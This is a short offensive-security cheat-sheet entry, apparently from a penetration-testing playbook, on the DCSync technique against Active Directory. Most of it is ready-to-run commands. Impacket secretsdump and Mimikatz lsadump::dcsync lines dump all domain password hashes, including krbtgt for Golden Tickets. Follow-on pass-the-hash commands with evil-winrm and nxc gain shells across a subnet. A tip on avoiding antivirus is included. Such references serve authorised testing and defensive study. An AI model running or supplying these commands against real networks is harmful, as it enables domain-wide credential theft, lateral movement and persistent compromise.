---
id: dcsync
title: DCSync
stage: privesc
tags: [windows, ad]
tools:
  - impacket-secretsdump $DOMAIN/user:password@$DC_IP
  - "impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP"
leads_to:
  - domain-admin
  - golden-ticket
  - silver-ticket
---

## Requirements

Account must have `Replicating Directory Changes` + `Replicating Directory Changes All` on the domain object. Domain Admins, Domain Controllers, and any account granted these rights via ACL abuse. BloodHound shows this as `DCSync` edges.

## From Linux (impacket)

```bash
# Dump all domain hashes
impacket-secretsdump $DOMAIN/user:password@$DC_IP
impacket-secretsdump $DOMAIN/user@$DC_IP -hashes :NTLM_HASH

# Just krbtgt (for Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP

# Full NTDS dump (just NT hashes)
impacket-secretsdump -just-dc $DOMAIN/user:password@$DC_IP
```

## From Windows (Mimikatz)

```powershell
privilege::debug
lsadump::dcsync /domain:$DOMAIN /user:Administrator
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /all /csv
```

## After Dump

```bash
# PTH as Administrator → shell on everything
evil-winrm -i $DC_IP -u Administrator -H <ADMIN_NTLM>
nxc smb 192.168.x.0/24 -u Administrator -H <ADMIN_NTLM> --local-auth

# Grab krbtgt → Golden Ticket → persistence forever
# (see golden-ticket node)
```

## Notes

DCSync does not require a local shell on the DC — it replicates AD over DRSUAPI (port 135 + dynamic). Remote impacket is preferred over on-box Mimikatz to avoid AV. Dumps `krbtgt` hash → Golden Ticket and `Administrator` hash → PTH.
